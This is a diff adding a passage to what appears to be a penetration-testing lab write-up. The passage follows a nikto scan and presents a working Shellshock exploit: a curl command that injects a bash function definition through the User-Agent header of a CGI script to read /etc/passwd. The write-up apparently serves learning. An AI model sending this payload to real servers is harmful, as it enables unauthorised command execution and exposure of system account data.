@@ -26,4 +26,12 @@ sudo nikto -h {target_ip}
 
 ![image](https://github.com/user-attachments/assets/0506f4cf-4705-4f83-827a-216d20bd8892)
 
+Let’s do some research on the Shellshock vulnerability we identified earlier. After a quick Google search, we’ve come across an exploit for it on GitHub.
+
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
+http://localhost:8080/cgi-bin/vulnerable
+
+![image](https://github.com/user-attachments/assets/43a6d242-ae4b-4849-9c55-c615d74d623f)
+
+
 
